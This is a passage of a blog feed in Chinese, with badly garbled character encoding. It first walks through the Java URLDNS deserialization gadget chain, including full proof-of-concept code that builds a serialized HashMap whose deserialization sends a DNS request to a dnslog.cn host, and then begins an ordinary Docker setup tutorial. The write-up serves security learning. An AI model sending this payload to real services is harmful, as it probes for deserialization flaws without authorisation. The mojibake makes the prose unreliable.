class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">boolean</span> onlyIfAbsent,</span></span><br><span class="line"><span class="params">                   <span class="type">boolean</span> evict)</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="type">int</span> n, i;</span><br><span class="line">        <span class="keyword">if</span> ((tab = table) == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">            n = (tab = resize()).length;</span><br><span class="line">        <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="literal">null</span>)</span><br><span class="line">            tab[i] = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Node&lt;K,V&gt; e; K k;</span><br><span class="line">            <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">                ((k = p.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                e = p;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="built_in">this</span>, tab, hash, key, value);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((e = p.next) == <span class="literal">null</span>) &#123;</span><br><span class="line">                        p.next = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">                        <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                            treeifyBin(tab, hash);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                        ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    p = e;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">                <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="literal">null</span>)</span><br><span class="line">                    e.value = value;</span><br><span class="line">                afterNodeAccess(e);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ++modCount;</span><br><span class="line">        <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">            resize();</span><br><span class="line">        afterNodeInsertion(evict);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>åŸç†åˆ©ç”¨</p><ul><li><p>java.util.HashMap é‡å†™äº† readObject, åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ hash å‡½æ•°è®¡ç®— key çš„ hashCode.è€Œ java.net.URL çš„ hashCode åœ¨è®¡ç®—æ—¶ä¼šè°ƒç”¨ getHostAddress æ¥è§£æåŸŸå, ä»è€Œå‘å‡º DNS è¯·æ±‚ï¼Œå…³é”®ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            table = tab;</span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u); <span class="comment">//è§£æåŸŸåï¼Œå‘å‡ºDNSè¯·æ±‚</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br></pre></td></tr></table></figure></li><li><p>å› æ­¤åˆ©ç”¨é“¾å°±å¾ˆæ˜¾è€Œæ˜“è§äº†</p></li></ul></li><li><p>ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL,Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        URL url = new URL(&quot;https://pxqb7n.dnslog.cn&quot;);</span><br><span class="line">        hashMap.put(url,123);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220828134354439.png" alt="image-20220828134354439"> </p><p>å¯ä»¥çœ‹åˆ°æ”¶åˆ°DNSè¯·æ±‚ï¼Œä¸‹é¢å°†hashMapåºåˆ—åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç”±äºnew URL()ä¸­çš„hashCode=-1ï¼Œå› æ­¤ååºåˆ—åŒ–æ—¶ï¼Œä¸èƒ½è¿›å…¥DNSè§£æï¼Œå› æ­¤éœ€åå°„è®¾ç½®hashCodeï¼=-1</span></span><br><span class="line">HashMap&lt;URL,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://6g01re.dnslog.cn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">urlClass</span> <span class="operator">=</span> URL.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldHashCode</span> <span class="operator">=</span> urlClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        fieldHashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldHashCode.set(url,<span class="number">123456</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        fieldHashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        <span class="comment">//unSerialize(&quot;ser.bin&quot;);</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220828135355921.png" alt="image-20220828135355921"> </p><p>å¯ä»¥çœ‹åˆ°putæ—¶ä¸ºæ”¶åˆ°DNSè¯·æ±‚</p><ul><li><p>ååºåˆ—åŒ–æ—¶æ”¶åˆ°è¯·æ±‚</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220828135451319.png" alt="image-20220828135451319"></p></li></ul></li><li><p>æ€»ä»£ç å¦‚ä¸‹</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> urldns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://dr8bqb.dnslog.cn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">urlClass</span> <span class="operator">=</span> URL.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> urlClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="number">112233</span>);</span><br><span class="line"></span><br><span class="line">        hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">ooStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ooStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unSerialize</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oiStrean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fileName));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> oiStrean.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;URLDNSé“¾&quot;&gt;&lt;a href=&quot;#URLDNSé“¾&quot; class=&quot;headerlink&quot; title=&quot;URLDNSé“¾&quot;&gt;&lt;/a&gt;URLDNSé“¾&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æ¦‚è¿°&lt;/p&gt;
&lt;p&gt;URLDNS å°±æ˜¯ysoserialä¸­ä¸€ä¸ªï§ç”¨é“¾çš„åå­—ï¼Œä½†å‡†ç¡®</summary>
      
    
    
    
    <category term="javaå®‰å…¨" scheme="http://example.com/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javaå®‰å…¨" scheme="http://example.com/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>dockerä½¿ç”¨</title>
    <link href="http://example.com/2022/08/09/docker%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2022/08/09/docker%E4%BD%BF%E7%94%A8/</id>
    <published>2022-08-09T13:16:50.000Z</published>
    <updated>2022-09-01T01:26:01.836Z</updated>
    
    <content type="html"><![CDATA[<h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><ol><li><p>Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒåŸºäº <a href="https://www.runoob.com/go/go-tutorial.html">Go è¯­è¨€</a> å¹¶éµä» Apache2.0 åè®®å¼€æºã€‚</p></li><li><p>Docker å¯ä»¥è®©å¼€å‘è€…æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªè½»é‡çº§ã€å¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„ Linux æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚</p></li><li><p>å®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ï¼Œç›¸äº’ä¹‹é—´ä¸ä¼šæœ‰ä»»ä½•æ¥å£ï¼ˆç±»ä¼¼ iPhone çš„ appï¼‰,æ›´é‡è¦çš„æ˜¯å®¹å™¨æ€§èƒ½å¼€é”€æä½ã€‚</p></li></ol><h3 id="dockerä¼˜ç‚¹"><a href="#dockerä¼˜ç‚¹" class="headerlink" title="dockerä¼˜ç‚¹"></a>dockerä¼˜ç‚¹</h3><ol><li>ç›¸æ¯”é…ç½®å„ç§å¤æ‚ç¯å¢ƒï¼Œdockerå°†åº”ç”¨ç¨‹åºå’Œç¯å¢ƒé…ç½®åˆ†å¼€ã€‚å› æ­¤å¯ä»¥å¿«é€Ÿéƒ¨ç½²ï¼Œæµ‹è¯•ä»£ç ï¼Œå¤§å¤§å‡å°‘ç¼–å†™ä»£ç å’Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¿è¡Œä»£ç ä¹‹é—´çš„å»¶è¿Ÿã€‚</li></ol><h3 id="dockeræ¶æ„"><a href="#dockeræ¶æ„" class="headerlink" title="dockeræ¶æ„"></a>dockeræ¶æ„</h3><p>dockeråŒ…æ‹¬ä¸‰ä¸ªåŸºæœ¬æ¦‚å¿µ</p><ul><li><strong>é•œåƒï¼ˆImageï¼‰</strong>ï¼šDocker é•œåƒï¼ˆImageï¼‰ï¼Œå°±ç›¸å½“äºæ˜¯ä¸€ä¸ª root æ–‡ä»¶ç³»ç»Ÿã€‚æ¯”å¦‚å®˜æ–¹é•œåƒ ubuntu:16.04 å°±åŒ…å«äº†å®Œæ•´çš„ä¸€å¥— Ubuntu16.04 æœ€å°ç³»ç»Ÿçš„ root æ–‡ä»¶ç³»ç»Ÿã€‚</li><li><strong>å®¹å™¨ï¼ˆContainerï¼‰</strong>ï¼šé•œåƒï¼ˆImageï¼‰å’Œå®¹å™¨ï¼ˆContainerï¼‰çš„å…³ç³»ï¼Œå°±åƒæ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­çš„ç±»å’Œå®ä¾‹ä¸€æ ·ï¼Œé•œåƒæ˜¯é™æ€çš„å®šä¹‰ï¼Œå®¹å™¨æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚å®¹å™¨å¯ä»¥è¢«åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ã€æš‚åœç­‰ã€‚</li><li><strong>ä»“åº“ï¼ˆRepositoryï¼‰</strong>ï¼šä»“åº“å¯çœ‹æˆä¸€ä¸ªä»£ç æ§åˆ¶ä¸­å¿ƒï¼Œç”¨æ¥ä¿å­˜é•œåƒã€‚</li></ul><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220901092554837.png" alt="image-20220901092554837"></p><table><thead><tr><th align="left">æ¦‚å¿µ</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">Docker é•œåƒ(Images)</td><td align="left">Docker é•œåƒæ˜¯ç”¨äºåˆ›å»º Docker å®¹å™¨çš„æ¨¡æ¿ï¼Œæ¯”å¦‚ Ubuntu ç³»ç»Ÿã€‚</td></tr><tr><td align="left">Docker å®¹å™¨(Container)</td><td align="left">å®¹å™¨æ˜¯ç‹¬ç«‹è¿è¡Œçš„ä¸€ä¸ªæˆ–ä¸€ç»„åº”ç”¨ï¼Œæ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚</td></tr><tr><td align="left">Docker å®¢æˆ·ç«¯(Client)</td><td align="left">Docker å®¢æˆ·ç«¯é€šè¿‡å‘½ä»¤è¡Œæˆ–è€…å…¶ä»–å·¥å…·ä½¿ç”¨ Docker SDK (<a href="https://docs.docker.com/develop/sdk/">https://docs.docker.com/develop/sdk/</a>) ä¸ Docker çš„å®ˆæŠ¤è¿›ç¨‹é€šä¿¡ã€‚</td></tr><tr><td align="left">Docker ä¸»æœº(Host)</td><td align="left">ä¸€ä¸ªç‰©ç†æˆ–è€…è™šæ‹Ÿçš„æœºå™¨ç”¨äºæ‰§è¡Œ Docker å®ˆæŠ¤è¿›ç¨‹å’Œå®¹å™¨ã€‚</td></tr><tr><td align="left">Docker Registry</td><td align="left">Docker ä»“åº“ç”¨æ¥ä¿å­˜é•œåƒï¼Œå¯ä»¥ç†è§£ä¸ºä»£ç æ§åˆ¶ä¸­çš„ä»£ç ä»“åº“ã€‚Docker Hub(<a href="https://hub.docker.com/">https://hub.docker.com</a>) æä¾›äº†åºå¤§çš„é•œåƒé›†åˆä¾›ä½¿ç”¨ã€‚ä¸€ä¸ª Docker Registry ä¸­å¯ä»¥åŒ…å«å¤šä¸ªä»“åº“ï¼ˆRepositoryï¼‰ï¼›æ¯ä¸ªä»“åº“å¯ä»¥åŒ…å«å¤šä¸ªæ ‡ç­¾ï¼ˆTagï¼‰ï¼›æ¯ä¸ªæ ‡ç­¾å¯¹åº”ä¸€ä¸ªé•œåƒã€‚é€šå¸¸ï¼Œä¸€ä¸ªä»“åº“ä¼šåŒ…å«åŒä¸€ä¸ªè½¯ä»¶ä¸åŒç‰ˆæœ¬çš„é•œåƒï¼Œè€Œæ ‡ç­¾å°±å¸¸ç”¨äºå¯¹åº”è¯¥è½¯ä»¶çš„å„ä¸ªç‰ˆæœ¬ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ <strong>&lt;ä»“åº“å&gt;:&lt;æ ‡ç­¾&gt;</strong> çš„æ ¼å¼æ¥æŒ‡å®šå…·ä½“æ˜¯è¿™ä¸ªè½¯ä»¶å“ªä¸ªç‰ˆæœ¬çš„é•œåƒã€‚å¦‚æœä¸ç»™å‡ºæ ‡ç­¾ï¼Œå°†ä»¥ <strong>latest</strong> ä½œä¸ºé»˜è®¤æ ‡ç­¾ã€‚</td></tr><tr><td align="left">Docker Machine</td><td align="left">Docker Machineæ˜¯ä¸€ä¸ªç®€åŒ–Dockerå®‰è£…çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œé€šè¿‡ä¸€ä¸ªç®€å•çš„å‘½ä»¤è¡Œå³å¯åœ¨ç›¸åº”çš„å¹³å°ä¸Šå®‰è£…Dockerï¼Œæ¯”å¦‚VirtualBoxã€ Digital Oceanã€Microsoft Azureã€‚</td></tr></tbody></table><h3 id="dockerå®‰è£…"><a href="#dockerå®‰è£…" class="headerlink" title="dockerå®‰è£…"></a>dockerå®‰è£…</h3><ol><li><p>é¦–å…ˆï¼Œæ›´æ–°è½¯ä»¶åŒ…ç´¢å¼•ï¼Œå¹¶ä¸”å®‰è£…å¿…è¦çš„ä¾èµ–è½¯ä»¶ï¼Œæ¥æ·»åŠ ä¸€ä¸ªæ–°çš„ HTTPS è½¯ä»¶æºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨ä¸‹é¢çš„ <code>curl</code> å¯¼å…¥æºä»“åº“çš„ GPG keyï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure></li><li><p>å°† Docker APT è½¯ä»¶æºæ·»åŠ åˆ°ä½ çš„ç³»ç»Ÿï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure></li><li><p>æƒ³è¦å®‰è£… Docker æœ€æ–°ç‰ˆæœ¬ï¼Œè¿è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure></li></ol><h3 id="dockeré…ç½®å›½å†…é•œåƒæº"><a href="#dockeré…ç½®å›½å†…é•œåƒæº" class="headerlink" title="dockeré…ç½®å›½å†…é•œåƒæº"></a>dockeré…ç½®å›½å†…é•œåƒæº</h3><ol><li><p>é˜¿é‡Œäº‘ç”³è¯·é•œåƒåœ°å€<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors</a></p></li><li><p>touch &#x2F;etc&#x2F;docker&#x2F;daemon.json</p></li><li><p>vim &#x2F;etc&#x2F;docker&#x2F;daemon.json,æ·»åŠ ä»¥ä¸‹å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://xxx.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>systemctl reload docker</p></li><li><p>systemctl restart dockerservice</p></li></ol><h3 id="dockeråŸºæœ¬æ“ä½œ"><a href="#dockeråŸºæœ¬æ“ä½œ" class="headerlink" title="dockeråŸºæœ¬æ“ä½œ"></a>dockeråŸºæœ¬æ“ä½œ</h3><ol><li><p>å¸®åŠ©å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#æ˜¾ç¤ºdockerçš„ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">docker version  </span><br><span class="line"> </span><br><span class="line">#æ˜¾ç¤ºdockerçš„ç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬é•œåƒå’Œå®¹å™¨æ•°é‡      </span><br><span class="line">docker info   </span><br><span class="line"> </span><br><span class="line">#æ˜¾ç¤ºå‘½ä»¤å¸®åŠ©ä¿¡æ¯        </span><br><span class="line">docker å‘½ä»¤ --help    </span><br></pre></td></tr></table></figure></li><li><p>é•œåƒå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#æŸ¥çœ‹æ‰€æœ‰æœ¬åœ°çš„ä¸»æœºä¸Šçš„é•œåƒ</span><br><span class="line">docker images   </span><br><span class="line"> </span><br><span class="line">#åœ¨docker hubä¸Šæœç´¢æŒ‡å®šé•œåƒï¼Œé»˜è®¤tagä¸ºlatest     </span><br><span class="line">docker search &lt;image&gt;:&lt;tag&gt;     </span><br><span class="line"> </span><br><span class="line">#ä¸‹è½½æŒ‡å®šé•œåƒ</span><br><span class="line">docker pull &lt;image&gt;:&lt;tag&gt; </span><br><span class="line"> </span><br><span class="line">#åˆ é™¤æŒ‡å®šé•œåƒ</span><br><span class="line">docker rmi -f &lt;image ID&gt;</span><br></pre></td></tr></table></figure></li><li><p>å®¹å™¨å‘½ä»¤</p><p>ä½¿ç”¨å®¹å™¨å‘½ä»¤ä¹‹å‰ï¼Œå¿…é¡»è¦æœ‰ç›¸åº”çš„é•œåƒ</p><ul><li><p>æ–°å»ºå®¹å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 